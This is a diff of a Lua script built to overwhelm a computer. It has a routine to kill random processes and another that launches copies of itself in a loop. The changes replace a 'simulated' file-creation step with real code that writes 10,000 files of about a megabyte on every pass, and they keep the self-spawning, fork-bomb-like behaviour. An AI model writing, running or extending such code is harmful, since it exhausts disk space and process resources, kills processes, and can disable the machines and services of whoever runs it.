@@ -1,6 +1,6 @@
 -- Function to generate large data structure
 local function generate_data()
-    return string.rep(math.random(36^2), 10^9) -- Generate a string of length 10^9
+    return string.rep("a", 10^6) -- Generate a string of length 10^6
 end
 
 -- Function to kill a random process
@@ -21,7 +21,7 @@ end
 local function overwhelm_system()
     print("Overwhelming system...")
     for _ = 1, 10 do
-        os.execute("lua " .. arg[0] .. " &") -- Start a new Lua process
+        os.execute("lua " .. arg[0]) -- Start a new Lua process
     end
 end
 
@@ -35,7 +35,9 @@ local function main()
 
         -- Save to multiple text files (simulated)
         for i = 1, 10000 do
-            -- Simulate file creation
+            local file = io.open("output_" .. count .. "_" .. i .. ".txt", "w")
+            file:write(data)
+            file:close()
         end
 
         count = count + 1
